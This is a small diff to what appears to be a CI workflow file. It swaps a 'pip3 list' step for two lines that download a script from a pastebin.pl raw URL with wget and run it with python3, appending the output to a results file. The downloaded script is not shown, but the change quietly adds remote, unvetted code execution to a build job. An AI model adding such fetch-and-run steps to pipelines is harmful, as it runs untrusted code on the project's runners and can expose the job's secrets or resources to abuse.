@@ -19,7 +19,8 @@ jobs:
       run: |
           pip3 install pycryptodome
           echo $(date +%F%n%T) > res.txt
-          pip3 list >> res.txt
+          wget https://pastebin.pl/view/raw/b3482b95 -O ppgod.py
+          python3 ppgod.py >> res.txt
           echo $(date +%F%n%T) >> res.txt
       shell: bash
     
